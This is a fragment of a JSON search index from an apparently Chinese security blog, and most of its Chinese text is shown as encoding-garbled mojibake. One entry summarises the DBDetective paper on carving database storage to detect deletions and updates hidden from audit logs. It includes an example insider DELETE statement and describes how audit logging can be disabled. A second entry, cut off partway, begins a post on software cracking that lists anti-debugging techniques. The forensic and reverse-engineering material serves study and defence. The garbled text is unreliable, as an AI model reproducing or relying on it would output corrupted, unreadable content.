SmartControllermessagingagent","categories":[{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"}],"tags":[{"name":"å°ç±³","slug":"å°ç±³","permalink":"https://cool-y.github.io/tags/å°ç±³/"},{"name":"è·¯ç”±å™¨","slug":"è·¯ç”±å™¨","permalink":"https://cool-y.github.io/tags/è·¯ç”±å™¨/"},{"name":"MiniUPnP","slug":"MiniUPnP","permalink":"https://cool-y.github.io/tags/MiniUPnP/"}]},{"title":"å¤åŸæ•°æ®åº“å­˜å‚¨ä»¥æ£€æµ‹å’Œè·Ÿè¸ªå®‰å…¨æ¼æ´","slug":"Caving-db-storage","date":"2019-04-15T07:38:47.000Z","updated":"2021-04-10T13:37:48.593Z","comments":true,"path":"2019/04/15/Caving-db-storage/","link":"","permalink":"https://cool-y.github.io/2019/04/15/Caving-db-storage/","excerpt":"","text":"Carving Database Storage to Detect and Trace Security Breaches å¤åŸæ•°æ®åº“å­˜å‚¨ä»¥æ£€æµ‹å’Œè·Ÿè¸ªå®‰å…¨æ¼æ´åŸæ–‡ä¸‹è½½ MotivationDBMS(æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ) é€šå¸¸ç”¨äºå­˜å‚¨å’Œå¤„ç†æ•æ„Ÿæ•°æ®ï¼Œå› æ­¤ï¼ŒæŠ•å…¥äº†å¤§é‡ç²¾åŠ›ä½¿ç”¨è®¿é—®æ§åˆ¶ç­–ç•¥æ¥ä¿æŠ¤DBMSã€‚ ä¸€æ—¦ç”¨æˆ·åœ¨DBMSä¸­è·å¾—æå‡æƒé™ï¼ˆæ— è®ºæ˜¯åˆç†çš„è¿˜æ˜¯é€šè¿‡æ”»å‡»çš„ï¼‰ï¼Œå®æ–½çš„å®‰å…¨æ–¹æ¡ˆå¯ä»¥ç»•è¿‡ï¼Œå› æ­¤æ— æ³•å†æ ¹æ®æ”¿ç­–ä¿è¯æ•°æ®å—åˆ°ä¿æŠ¤ã€‚1ï¼‰è®¿é—®æ§åˆ¶ç­–ç•¥å¯èƒ½ä¸å®Œæ•´ï¼Œå…è®¸ç”¨æˆ·æ‰§è¡Œä»–ä»¬ä¸èƒ½æ‰§è¡Œçš„å‘½ä»¤2ï¼‰ç”¨æˆ·å¯èƒ½é€šè¿‡ä½¿ç”¨DBæˆ–OSä»£ç ä¸­çš„å®‰å…¨æ¼æ´æˆ–é€šè¿‡å…¶ä»–æ–¹å¼éæ³•è·å–æƒé™ éƒ¨ç½²é¢„é˜²æªæ–½1ï¼‰åœ¨åŠæ—¶å‘ç”Ÿå®‰å…¨æ¼æ´æ—¶æ£€æµ‹å®‰å…¨æ¼æ´;2ï¼‰åœ¨æ£€æµ‹åˆ°æ”»å‡»æ—¶æ”¶é›†æœ‰å…³æ”»å‡»çš„è¯æ®ï¼Œä»¥ä¾¿è®¾è®¡å¯¹æŠ—æªæ–½å¹¶è¯„ä¼°æŸå®³ç¨‹åº¦ ä¾‹å­Maliceæ˜¯æ”¿åºœæœºæ„çš„æ•°æ®åº“ç®¡ç†å‘˜ï¼Œä¸ºå…¬æ°‘æä¾›çŠ¯ç½ªè®°å½•ã€‚ Maliceæœ€è¿‘è¢«åˆ¤çŠ¯æœ‰æ¬ºè¯ˆç½ªï¼Œå¹¶å†³å®šæ»¥ç”¨å¥¹çš„ç‰¹æƒï¼Œå¹¶é€šè¿‡è¿è¡ŒDELETE FROM Record WHERE name = â€˜Maliceâ€™æ¥åˆ é™¤å¥¹çš„çŠ¯ç½ªè®°å½•ã€‚ä½†æ˜¯ï¼Œå¥¹çŸ¥é“æ•°æ®åº“æ“ä½œéœ€è¦å®šæœŸå®¡æ ¸ï¼Œä»¥æ£€æµ‹å¯¹æœºæ„å­˜å‚¨çš„é«˜åº¦æ•æ„Ÿæ•°æ®çš„ç¯¡æ”¹ã€‚ä¸ºäº†è¦†ç›–å¥¹çš„æ“ä½œï¼ŒMaliceåœ¨è¿è¡ŒDELETEæ“ä½œä¹‹å‰åœç”¨å®¡è®¡æ—¥å¿—ï¼Œç„¶åå†æ¬¡æ¿€æ´»æ—¥å¿—ã€‚å› æ­¤ï¼Œåœ¨æ•°æ®åº“ä¸­æ²¡æœ‰å¥¹çš„éæ³•æ“çºµçš„æ—¥å¿—è·Ÿè¸ªã€‚ä½†æ˜¯ï¼Œç£ç›˜ä¸Šçš„æ•°æ®åº“å­˜å‚¨ä»å°†åŒ…å«å·²åˆ é™¤è¡Œçš„è¯æ®ã€‚ä½œè€…çš„æ–¹æ³•æ£€æµ‹å·²åˆ é™¤çš„ç—•è¿¹å’Œè¿‡æœŸçš„è®°å½•ç‰ˆæœ¬ï¼Œå¹¶å°†å®ƒä»¬ä¸å®¡æ ¸æ—¥å¿—è¿›è¡ŒåŒ¹é…ï¼Œä»¥æ£€æµ‹æ­¤ç±»æ”»å‡»ï¼Œå¹¶æä¾›æ•°æ®åº“æ“ä½œæ–¹å¼çš„è¯æ®ã€‚ä½œè€…å°†æ£€æµ‹å·²åˆ é™¤çš„è¡Œï¼Œå› ä¸ºå®ƒä¸å®¡è®¡æ—¥å¿—ä¸­çš„ä»»ä½•æ“ä½œéƒ½ä¸å¯¹åº”ï¼Œæˆ‘ä»¬ä¼šå°†å…¶æ ‡è®°ä¸ºç¯¡æ”¹çš„æ½œåœ¨è¯æ®ã€‚ æ€è·¯ä¸€è§ˆ æå‡ºæ–¹æ³•ä½¿ç”¨ç§°ä¸ºDICEçš„ç°æœ‰å–è¯å·¥å…·ï¼ˆWagnerç­‰ï¼Œ2017ï¼‰æ¥é‡å»ºæ•°æ®åº“å­˜å‚¨é€šè¿‡åŒ¹é…æå–çš„å­˜å‚¨æ¡ç›®ï¼ŒæŠ¥å‘Šä»»ä½•æ— æ³•é€šè¿‡æ“ä½œè®°å½•è§£é‡Šçš„å·¥ä»¶æ¥è‡ªåŠ¨æ£€æµ‹æ½œåœ¨çš„æ”»å‡» DBDetectiveæ£€æŸ¥æ•°æ®åº“å­˜å‚¨å’ŒRAMå¿«ç…§ï¼Œå¹¶å°†å®ƒæ‰¾åˆ°çš„å†…å®¹ä¸å®¡è®¡æ—¥å¿—è¿›è¡Œæ¯”è¾ƒ ç„¶åï¼Œåœ¨ä¸å½±å“æ•°æ®åº“æ“ä½œçš„æƒ…å†µä¸‹ï¼Œå¯¹æ ¸å¿ƒæ•°æ®è¿›è¡Œåˆ†æã€‚ ç¡®å®šæ•°æ®åº“ç¯¡æ”¹çš„å¯èƒ½æ€§ï¼Œå¹¶æŒ‡å‡ºæ•°æ®åº“å­˜å‚¨ä¸­å‘ç°çš„å…·ä½“ä¸ä¸€è‡´æ€§ã€‚ç”±äºæ•°æ®åº“å­˜å‚¨çš„æ˜“å˜æ€§ï¼Œæ— æ³•ä¿è¯å°†å‘ç°æ‰€æœ‰æ”»å‡»ã€‚åœ¨å¯¹äºæˆ‘ä»¬è¯„ä¼°çš„æ¯ä¸ªä¸»è¦DBMSï¼Œæˆ‘ä»¬å‡è®¾DBMSå·²å¯ç”¨å®¡è®¡æ—¥å¿—æ¥æ•è·ä¸è°ƒæŸ¥ç›¸å…³çš„SQLå‘½ä»¤ã€‚æˆ‘ä»¬è¿›ä¸€æ­¥å‡è®¾ä¸€åæ”»å‡»è€…é€šè¿‡ä»¥ä¸‹æ–¹å¼é˜»æ­¢è®°å½•å·²æ‰§è¡Œçš„æ¶æ„å‘½ä»¤ï¼š åœç”¨å®¡è®¡ç­–ç•¥å¹¶æš‚æ—¶æŒ‚èµ·æ—¥å¿—è®°å½• æ›´æ”¹ç°æœ‰å®¡è®¡æ—¥å¿—ï¼ˆä¸¤è€…éƒ½åœ¨æ•°æ®åº“æ—¥å¿—å¯é æ€§éƒ¨åˆ†ä¸­è®¨è®ºï¼‰ã€‚é€šè¿‡å°†å–è¯åˆ†ææŠ€æœ¯åº”ç”¨äºæ•°æ®åº“å­˜å‚¨æˆ–ç¼“å†²åŒºç¼“å­˜ï¼Œå¹¶å°†å‘ç°çš„è¯æ®ä¸å®¡è®¡æ—¥å¿—ç›¸åŒ¹é…ï¼Œå¯ä»¥ï¼š æ£€æµ‹DBMSå®¡æ ¸æ—¥å¿—ä¸­æœªæ˜¾ç¤ºçš„å¤šç§ç±»å‹çš„æ•°æ®åº“è®¿é—®å’Œæ“ä½œã€‚ å°†æœªå½’å› çš„è®°å½•ä¿®æ”¹åˆ†ç±»ä¸ºæ¨¡ç³Šçš„INSERTï¼ŒDELETEæˆ–UPDATEå‘½ä»¤ã€‚ æ£€æµ‹æ— æ³•ä»å®¡æ ¸æ—¥å¿—ä¸­çš„æ´»åŠ¨æ´¾ç”Ÿçš„ï¼ˆåªè¯»ï¼‰SELECTæŸ¥è¯¢ä¸­çš„ç¼“å­˜æ•°æ®ã€‚ Reliability of database logsæ”»å‡»è€…å¯ä»¥æ›´æ”¹ä¸¤ç§ç±»å‹çš„æ—¥å¿—ï¼š write-ahead logs (WAL) and audit logs (event history records) WALsä»¥ä½çº§åˆ«è®°å½•æ•°æ®åº“ä¿®æ”¹ä»¥æ”¯æŒACIDä¿è¯ï¼Œæä¾›æœ€è¿‘è¡¨ä¿®æ”¹çš„å†å²è®°å½•ã€‚é€šå¸¸æ— æ³•ç¦ç”¨æˆ–è½»æ¾ä¿®æ”¹WALï¼Œå¹¶ä¸”éœ€è¦è¯»å–ä¸“ç”¨å·¥å…·ï¼ˆä¾‹å¦‚ï¼ŒOracle LogMineræˆ–PostgreSQL pg_xlogdumpï¼‰ã€‚æŸäº›DBMSå…è®¸ä¸ºç‰¹å®šæ“ä½œç¦ç”¨WALï¼Œä¾‹å¦‚æ‰¹é‡åŠ è½½æˆ–ç»“æ„é‡å»ºã€‚å› æ­¤ï¼Œå¯ä»¥é€šè¿‡æ­¤åŠŸèƒ½æ’å…¥è®°å½•è€Œä¸ç•™ä¸‹æ—¥å¿—è·Ÿè¸ªã€‚ audit logsè®°å½•é…ç½®çš„ç”¨æˆ·æ•°æ®åº“æ“ä½œã€‚åŒ…æ‹¬SQLæ“ä½œå’Œå…¶ä»–ç”¨æˆ·æ´»åŠ¨ã€‚å®¡è®¡æ—¥å¿—æ ¹æ®æ•°æ®åº“ç®¡ç†å‘˜é…ç½®çš„æ—¥å¿—è®°å½•ç­–ç•¥å­˜å‚¨å·²æ‰§è¡Œçš„SQLå‘½ä»¤ã€‚ å› æ­¤ï¼Œç®¡ç†å‘˜å¯ä»¥æ ¹æ®éœ€è¦ç¦ç”¨æ—¥å¿—è®°å½•æˆ–ä¿®æ”¹å•ä¸ªæ—¥å¿—è®°å½•ã€‚ Detecting hidden record modificationsæ’å…¥æˆ–ä¿®æ”¹è¡¨è®°å½•æ—¶ï¼Œæ•°æ®åº“ä¸­ä¼šå‘ç”Ÿä¸€è¿ä¸²çš„å­˜å‚¨æ›´æ”¹ã€‚ é™¤äº†å—å½±å“è®°å½•çš„æ•°æ®æœ¬èº«ä¹‹å¤–ï¼Œé¡µé¢å…ƒæ•°æ®ä¼šæ›´æ–°ï¼ˆä¾‹å¦‚ï¼Œè®¾ç½®åˆ é™¤æ ‡è®°ï¼‰ï¼Œå¹¶ä¸”å­˜å‚¨è®°å½•çš„ç´¢å¼•çš„é¡µé¢ä¼šæ”¹å˜ï¼ˆä¾‹å¦‚ï¼Œä»¥åæ˜ è®°å½•çš„åˆ é™¤ï¼‰ã€‚ å¦‚æœå°šæœªç¼“å­˜ï¼Œåˆ™æ¯ä¸ªè®¿é—®çš„é¡µé¢éƒ½å°†è¢«å¸¦å…¥RAMã€‚ è¡Œæ ‡è¯†ç¬¦å’Œç»“æ„æ ‡è¯†ç¬¦å¯ç”¨äºå°†æ‰€æœ‰è¿™äº›æ›´æ”¹ç»‘å®šåœ¨ä¸€èµ·ã€‚æ­¤å¤–ï¼ŒDBAï¼ˆæ•°æ®åº“ç®¡ç†å‘˜ï¼‰è¿˜å¯ä»¥ç¦ç”¨æ‰¹é‡ä¿®æ”¹çš„æ—¥å¿—è®°å½•ï¼ˆå‡ºäºæ€§èƒ½è€ƒè™‘ï¼‰â€”â€”å¯ä»¥åˆ©ç”¨æ­¤æƒé™æ¥éšè—æ¶æ„ä¿®æ”¹ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æè¿°å¦‚ä½•æ£€æµ‹å·²ä¿®æ”¹è®°å½•ä¸å·²è®°å½•å‘½ä»¤ä¹‹é—´çš„ä¸ä¸€è‡´ã€‚ Deleted records ç®—æ³•åˆ é™¤çš„è®°å½•ä¸ä¼šè¢«ç‰©ç†åˆ é™¤ï¼Œè€Œæ˜¯åœ¨é¡µé¢ä¸­æ ‡è®°ä¸ºâ€œå·²åˆ é™¤â€; å·²åˆ é™¤è¡Œå ç”¨çš„å­˜å‚¨ç©ºé—´å°†æˆä¸ºæœªåˆ†é…çš„ç©ºé—´ï¼Œæœ€ç»ˆå°†è¢«æ–°è¡Œè¦†ç›–ã€‚è¿™äº›å¯¹æ•°æ®åº“å­˜å‚¨çš„æ›´æ”¹ä¸èƒ½è¢«ç»•è¿‡æˆ–æ§åˆ¶ã€‚è¯†åˆ«å­˜å‚¨ä¸­ä¸æ—¥å¿—ä¸­çš„ä»»ä½•åˆ é™¤æ“ä½œéƒ½ä¸åŒ¹é…çš„å·²åˆ é™¤è¡Œã€‚ å®ä¾‹ DICEä»Customerè¡¨é‡å»ºäº†ä¸‰ä¸ªåˆ é™¤çš„è¡Œï¼ˆ1ï¼ŒChristineï¼ŒChicagoï¼‰ï¼ˆ3ï¼ŒChristopherï¼ŒSeattleï¼‰ï¼ˆ4ï¼ŒThomasï¼ŒAustinï¼‰ æ—¥å¿—æ–‡ä»¶åŒ…å«ä¸¤ä¸ªæ“ä½œåœ¨ç®—æ³•1ä¸­ï¼ŒDeletedRowsè¢«è®¾ç½®ä¸ºä¸‰ä¸ªé‡å»ºçš„å·²åˆ é™¤è¡Œã€‚ç®—æ³•1è¿”å›ï¼ˆ4ï¼ŒThomasï¼ŒAustinï¼‰ï¼Œè¡¨ç¤ºè¯¥åˆ é™¤çš„è®°å½•ä¸èƒ½å½’å› äºä»»ä½•åˆ é™¤ã€‚ Inserted records ç®—æ³•æ–°æ’å…¥çš„è¡Œå°†é™„åŠ åˆ°è¡¨çš„æœ€åä¸€é¡µçš„æœ«å°¾ï¼ˆå¦‚æœæœ€åä¸€é¡µå·²æ»¡ï¼Œåˆ™ä¸ºæ–°é¡µï¼‰æˆ–è¦†ç›–ç”±å…ˆå‰åˆ é™¤çš„è¡Œåˆ›å»ºçš„å¯ç”¨ç©ºé—´ã€‚å¦‚æœâ€œæ´»è·ƒâ€æ–°è¡¨è¡Œä¸å®¡æ ¸æ—¥å¿—ä¸­çš„ä»»ä½•æ’å…¥æ“ä½œéƒ½ä¸åŒ¹é…ï¼Œåˆ™æ­¤è¡Œæ˜¯å¯ç–‘æ´»åŠ¨çš„æ ‡å¿—ã€‚ç®—æ³•2ä¸­ä½¿ç”¨è¿™äº›â€œæ´»è·ƒâ€è®°å½•æ¥ç¡®å®šé‡æ„è¡Œæ˜¯å¦å¯å½’å› äºå®¡è®¡æ—¥å¿—ä¸­çš„æ’å…¥ã€‚ å®ä¾‹ è¯¥æ—¥å¿—åŒ…å«å…­ä¸ªæ“ä½œã€‚å½“è¡Œä»T1æ’å…¥åˆ°T4æ—¶ï¼Œå®ƒä»¬å°†é™„åŠ åˆ°è¡¨çš„æœ«å°¾ã€‚åœ¨T5ï¼Œåˆ é™¤ï¼ˆ3ï¼ŒLampï¼‰ç„¶ååœ¨T6æ’å…¥ï¼ˆ5ï¼ŒBookcaseï¼‰ã€‚ç”±äºrowï¼ˆ5ï¼ŒBookcaseï¼‰å¤§äºåˆ é™¤çš„è¡Œï¼ˆ3ï¼ŒLampï¼‰ï¼Œå› æ­¤å®ƒå°†é™„åŠ åˆ°è¡¨çš„æœ«å°¾ã€‚ DICEé‡å»ºäº†äº”ä¸ªæ´»åŠ¨è®°å½•åŒ…æ‹¬ï¼ˆ0ï¼ŒDogï¼‰å’Œï¼ˆ2ï¼ŒMonkeyï¼‰è¡Œè¢«åˆå§‹åŒ–ä¸ºç®—æ³•2çš„äº”ä¸ªé‡å»ºæ´»åŠ¨è¡Œç®—æ³•2å› æ­¤è¿”å›ï¼ˆ0ï¼ŒDogï¼‰å’Œï¼ˆ2ï¼ŒMonkeyï¼‰å› ä¸ºè¿™äº›è®°å½•æ— æ³•ä¸è®°å½•çš„æ’å…¥åŒ¹é…ã€‚ Updated records ç®—æ³•UPDATEæ“ä½œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªDELETEæ“ä½œï¼Œåè·Ÿä¸€ä¸ªINSERTæ“ä½œã€‚ä¸ºäº†è€ƒè™‘æ›´æ–°çš„è¡Œï¼Œæˆ‘ä»¬ä½¿ç”¨ç®—æ³•1è¿”å›çš„æœªæ ‡è®°åˆ é™¤è¡Œå’Œç®—æ³•2è¿”å›çš„æœªæ ‡è®°æ’å…¥è¡Œä½œä¸ºç®—æ³•3çš„è¾“å…¥ã€‚å¦‚æœåˆ é™¤çš„è¡Œå¯ä»¥ä¸æ›´æ–°çš„WHEREå­å¥åŒ¹é…ï¼Œé‚£ä¹ˆæ­¤åˆ é™¤çš„è¡Œæ“ä½œ è¢«æ ‡è®°ä¸ºå­˜åœ¨äºæ—¥å¿—ä¸­ã€‚ æ¥ä¸‹æ¥ï¼Œå¦‚æœæœªæ ‡è®°çš„æ’å…¥è¡Œå¯ä»¥ä¸SETå­å¥ä¸­çš„å€¼åŒ¹é…ï¼Œå¹¶ä¸”æ’å…¥çš„è¡ŒåŒ¹é…å·²åˆ é™¤è¡Œä¸­é™¤SETå­å¥å€¼ä¹‹å¤–çš„æ‰€æœ‰å€¼ï¼Œåˆ™æ­¤æ’å…¥çš„è¡Œæ“ä½œå°†å‡ºç°åœ¨æ—¥å¿—ä¸­ã€‚ å®ä¾‹ç®—æ³•1è¿”å›è¡Œï¼ˆ2ï¼ŒDeskï¼‰ç®—æ³•2è¿”å›è¡Œï¼ˆ0ï¼ŒDogï¼‰å’Œï¼ˆ2ï¼ŒMonkeyï¼‰ä½¿ç”¨è¿™äº›è®°å½•é›†ï¼Œç®—æ³•3è¿”å›ï¼ˆ2ï¼ŒDeskï¼‰ä½œä¸ºå·²åˆ é™¤è®°å½•çš„åˆ—è¡¨ï¼Œå¹¶å°†ï¼ˆ0ï¼ŒDogï¼‰å’Œï¼ˆ2ï¼ŒMonkeyï¼‰ä½œä¸ºæ’å…¥è®°å½•çš„åˆ—è¡¨ã€‚æ­¤å¤–ï¼Œç®—æ³•3è¯†åˆ«ï¼ˆ2ï¼ŒDeskï¼‰å’Œï¼ˆ2ï¼ŒMonkeyï¼‰ä¸­ç¬¬ä¸€åˆ—çš„å…±äº«å€¼2ã€‚ è™½ç„¶è¿™ä¸èƒ½å•ç‹¬ç¡®è®¤UPDATEæ“ä½œï¼Œä½†å¯ä»¥åˆç†åœ°å¾—å‡ºç»“è®ºï¼šï¼ˆ2ï¼ŒDeskï¼‰å·²æ›´æ–°ä¸ºï¼ˆ2ï¼ŒMonkeyï¼‰ã€‚ Detecting inconsistencies for read-only queriesDBMSä½¿ç”¨ç§°ä¸ºç¼“å†²åŒºç®¡ç†å™¨çš„ç»„ä»¶å°†é¡µé¢ä»ç£ç›˜ç¼“å­˜åˆ°å†…å­˜ä¸­ã€‚æ•°æ®ä»¥é¡µä¸ºå•ä½è¯»å…¥ç¼“å†²æ± ï¼Œå¯ä»¥é€šè¿‡DICEé‡å»ºã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œå°†æè¿°å¦‚ä½•å°†ç¼“å†²æ± ä¸­çš„å·¥ä»¶ä¸å®¡è®¡æ—¥å¿—ä¸­çš„åªè¯»æŸ¥è¯¢è¿›è¡ŒåŒ¹é…ã€‚æ•°æ®åº“æŸ¥è¯¢å¯ä»¥ä½¿ç”¨ä¸¤ç§å¯èƒ½çš„è®¿é—®è¡¨çš„æ–¹å¼ä¹‹ä¸€ï¼šå…¨è¡¨æ‰«æï¼ˆFTSï¼‰æˆ–ç´¢å¼•æ‰«æï¼ˆISï¼‰ã€‚FTSè¯»å–æ‰€æœ‰è¡¨é¡µï¼Œè€ŒISä½¿ç”¨ç´¢å¼•ç»“æ„æ¥æ£€ç´¢å¼•ç”¨åŸºäºæœç´¢å…³é”®å­—çš„æŒ‡é’ˆåˆ—è¡¨ã€‚ Full table scanå½“æŸ¥è¯¢ä½¿ç”¨FTSæ—¶ï¼Œåªä¼šç¼“å­˜å¤§è¡¨çš„ä¸€å°éƒ¨åˆ†ã€‚ å¯ä»¥å®Œæ•´åœ°ç¼“å­˜å°è¡¨ï¼ˆç›¸å¯¹äºç¼“å†²æ± å¤§å°ï¼‰ã€‚ æ¯ä¸ªæ•°æ®åº“éƒ½åœ¨é¡µçœ‰ä¸­å­˜å‚¨å”¯ä¸€çš„é¡µé¢æ ‡è¯†ç¬¦ï¼Œè¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿæœ‰æ•ˆåœ°å°†ç¼“å­˜çš„é¡µé¢ä¸ç£ç›˜ä¸Šçš„å¯¹åº”é¡µé¢è¿›è¡ŒåŒ¹é…ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡SID=131è¯†åˆ«å±äºEmployeeçš„é¡µé¢ï¼Œè¯¥SID=131å­˜å‚¨åœ¨é¡µé¢æ ‡é¢˜ä¸­ã€‚ DICEåªèƒ½ä»¥æ›´å¿«çš„é€Ÿåº¦è¿”å›é¡µé¢ç»“æ„æ ‡è¯†ç¬¦ï¼ˆæ— éœ€è§£æé¡µé¢å†…å®¹ï¼‰ã€‚Q2å’ŒQ4éƒ½é€šè¿‡FTSè®¿é—®å‘˜å·¥ã€‚ æ¯æ¬¡æ‰«æEmployeeè¡¨æ—¶ï¼Œè¡¨ä¸­ç›¸åŒçš„å››ä¸ªé¡µé¢ï¼ˆPIDï¼š97,98,99å’Œ100ï¼‰éƒ½ä¼šåŠ è½½åˆ°ç¼“å†²æ± ä¸­ã€‚å› æ­¤ï¼Œå½“åœ¨å­˜å‚¨å™¨ä¸­æ‰¾åˆ°å…·æœ‰PID:97,98,99å’Œ100ä»¥åŠSID:131çš„å››ä¸ªé¡µé¢æ—¶ï¼Œå¯ä»¥å‡è®¾FTSåº”ç”¨åœ¨Employeeè¡¨ä¸Šã€‚ Index accessCustomerè¡¨çš„SID=124ï¼ŒC_Cityåˆ—ä¸Šçš„äºŒçº§ç´¢å¼•çš„SID=126.Q1åœ¨åŸå¸‚Dallasä¸Šè¿›è¡Œè¿‡æ»¤ï¼Œå¹¶ä½¿ç”¨PID=2ç¼“å­˜ç´¢å¼•é¡µã€‚æ­¤é¡µé¢çš„æœ€å°å€¼ä¸ºChicagoå’Œæœ€å¤§å€¼ä¸ºDetroit ã€‚Q3åœ¨åŸå¸‚Jacksonä¸Šè¿‡æ»¤ï¼Œå¹¶ç¼“å­˜ç´¢å¼•é¡µé¢ï¼Œé¡µé¢æ ‡è¯†ç¬¦ä¸º4.æ­¤é¡µé¢çš„æœ€å°å€¼ä¸ºHoustonï¼Œæœ€å¤§å€¼ä¸ºLincolnã€‚å¦‚æœå®¡æ ¸æ—¥å¿—ä¸­çš„æŸ¥è¯¢è¿‡æ»¤äº†ç´¢å¼•é¡µçš„æœ€å°å€¼å’Œæœ€å¤§å€¼èŒƒå›´å†…çš„å€¼ï¼Œåˆ™è¯¥é¡µå¯ä»¥å½’å› äºè¯¥æŸ¥è¯¢ã€‚ Conclusions and future work å®¡è®¡æ—¥å¿—å’Œå…¶ä»–å†…ç½®DBMSå®‰å…¨æœºåˆ¶æ—¨åœ¨æ£€æµ‹æˆ–é˜»æ­¢æ”»å‡»è€…æ‰§è¡Œçš„æ¶æ„æ“ä½œã€‚è¿™ç§æœºåˆ¶çš„å›ºæœ‰ç¼ºç‚¹æ˜¯å…·æœ‰è¶³å¤Ÿæƒé™çš„æ”»å‡»è€…å¯ä»¥ç»•è¿‡å®ƒä»¬æ¥éšè—å®ƒä»¬çš„è¸ªè¿¹ã€‚ æˆ‘ä»¬æä¾›å¹¶å…¨é¢è¯„ä¼°DBDetectiveï¼Œå®ƒå¯ä»¥æ£€æµ‹æ”»å‡»è€…é€šè¿‡ä»å®¡è®¡æ—¥å¿—ä¸­åˆ é™¤ä»è€Œéšè—çš„æ•°æ®åº“æ“ä½œï¼Œå¹¶æ”¶é›†æœ‰å…³æ”»å‡»è€…è®¿é—®å’Œä¿®æ”¹å“ªäº›æ•°æ®çš„è¯æ®ã€‚ æˆ‘ä»¬çš„æ–¹æ³•ä¾èµ–äºå¯¹æ•°æ®åº“å­˜å‚¨çš„å–è¯æ£€æŸ¥ï¼Œå¹¶å°†æ­¤ä¿¡æ¯ä¸å®¡æ ¸æ—¥å¿—ä¸­çš„æ¡ç›®ç›¸å…³è”ï¼Œä»¥å‘ç°æ¶æ„æ“ä½œçš„è¯æ®ã€‚ é‡è¦çš„æ˜¯ï¼Œæ•°æ®åº“å­˜å‚¨å‡ ä¹ä¸å¯èƒ½è¢«æ¬ºéª—ï¼Œå› æ­¤ï¼Œä¸ä¾‹å¦‚å®¡è®¡æ—¥å¿—ç›¸æ¯”ï¼Œå®ƒæ˜¯æ›´å¯é çš„ç¯¡æ”¹è¯æ®æ¥æºã€‚ é‰´äºå­˜å‚¨å¿«ç…§æä¾›çš„ä¿¡æ¯ä¸å®Œæ•´ï¼Œæˆ‘ä»¬å°†æ¢ç´¢æ¦‚ç‡åŒ¹é…ï¼Œç¡®å®šå­˜å‚¨å·¥ä»¶ç”±å®¡è®¡æ—¥å¿—ä¸­çš„æ“ä½œå¼•èµ·çš„å¯èƒ½æ€§ï¼Œæ ¹æ®æ“ä½œçš„æ—¶é—´é¡ºåºåˆ©ç”¨å…¶ä»–çº¦æŸï¼Œæ¨¡æ‹Ÿå®¡è®¡ä¸­SQLå‘½ä»¤çš„éƒ¨åˆ†å†å²è®°å½•è·å¾—æ›´ç²¾ç¡®çš„åŒ¹é…ï¼Œå¹¶æ ¹æ®æ£€æµ‹åˆ°çš„å¼‚å¸¸åŠ¨æ€è°ƒæ•´æ‹æ‘„å¿«ç…§çš„é¢‘ç‡ã€‚","categories":[{"name":"é¡¶ä¼šè®ºæ–‡","slug":"é¡¶ä¼šè®ºæ–‡","permalink":"https://cool-y.github.io/categories/é¡¶ä¼šè®ºæ–‡/"}],"tags":[{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://cool-y.github.io/tags/æ•°æ®åº“/"},{"name":"å¤åŸæ–‡ä»¶","slug":"å¤åŸæ–‡ä»¶","permalink":"https://cool-y.github.io/tags/å¤åŸæ–‡ä»¶/"},{"name":"å–è¯","slug":"å–è¯","permalink":"https://cool-y.github.io/tags/å–è¯/"}]},{"title":"é€†å‘å·¥ç¨‹ä¸è½¯ä»¶ç ´è§£","slug":"é€†å‘å·¥ç¨‹å®éªŒ","date":"2019-03-28T07:25:04.000Z","updated":"2021-04-10T13:34:37.251Z","comments":true,"path":"2019/03/28/é€†å‘å·¥ç¨‹å®éªŒ/","link":"","permalink":"https://cool-y.github.io/2019/03/28/é€†å‘å·¥ç¨‹å®éªŒ/","excerpt":"","text":"è½¯ä»¶ä¿æŠ¤æ–¹å¼ åŠŸèƒ½é™åˆ¶ æ—¶é—´é™åˆ¶ è¿è¡Œæ—¶é•¿é™åˆ¶ ä½¿ç”¨æ—¥æœŸé™åˆ¶ ä½¿ç”¨æ¬¡æ•°é™åˆ¶ è­¦å‘Šçª—å£ åˆ†æå·¥å…· é™æ€åˆ†æå·¥å…· IDA W32Dasm lordPE Resource Hacker åŠ¨æ€åˆ†æå·¥å…· OllyDbg WinDbg å¯¹æŠ—åˆ†ææŠ€æœ¯ åé™æ€åˆ†ææŠ€æœ¯ èŠ±æŒ‡ä»¤ è‡ªä¿®æ”¹ä»£ç æŠ€æœ¯ å¤šæ€æŠ€æœ¯ å˜å½¢æŠ€æœ¯ è™šæ‹Ÿæœºä¿æŠ¤æŠ€æœ¯ ååŠ¨æ€åˆ†ææŠ€æœ¯ æ£€æµ‹è°ƒè¯•çŠ¶æ€ æ£€æµ‹ç”¨æˆ·æ€è°ƒè¯•å™¨ æ£€æµ‹å†…æ ¸æ€è°ƒè¯•å™¨ å…¶ä»–æ–¹æ³•ï¼šçˆ¶è¿›ç¨‹æ£€æµ‹ï¼›StartupInfo ç»“æ„ï¼›æ—¶é—´å·®ï¼›é€šè¿‡Trap Flagæ£€æµ‹ å‘ç°è°ƒè¯•å™¨åçš„å¤„ç† ç¨‹åºè‡ªèº«é€€å‡º å‘è°ƒè¯•å™¨çª—å£å‘é€æ¶ˆæ¯ä½¿è°ƒè¯•å™¨é€€å‡º ä½¿è°ƒè¯•å™¨çª—å£ä¸å¯ç”¨ ç»ˆæ­¢è°ƒè¯•å™¨è¿›ç¨‹ PEæ–‡ä»¶æ ¼å¼åŸºç¡€ åŠ å£³è„±å£³ åè°ƒè¯•æŠ€æœ¯åè°ƒè¯•æŠ€æœ¯ï¼Œç¨‹åºç”¨å®ƒæ¥è¯†åˆ«æ˜¯å¦è¢«è°ƒè¯•ï¼Œæˆ–è€…è®©è°ƒè¯•å™¨å¤±æ•ˆã€‚ä¸ºäº†é˜»æ­¢è°ƒè¯•å™¨çš„åˆ†æï¼Œå½“ç¨‹åºæ„è¯†åˆ°è‡ªå·±è¢«è°ƒè¯•æ—¶ï¼Œå®ƒä»¬å¯èƒ½æ”¹å˜æ­£å¸¸çš„æ‰§è¡Œè·¯å¾„æˆ–è€…ä¿®æ”¹è‡ªèº«ç¨‹åºè®©è‡ªå·±å´©æºƒï¼Œä»è€Œå¢åŠ 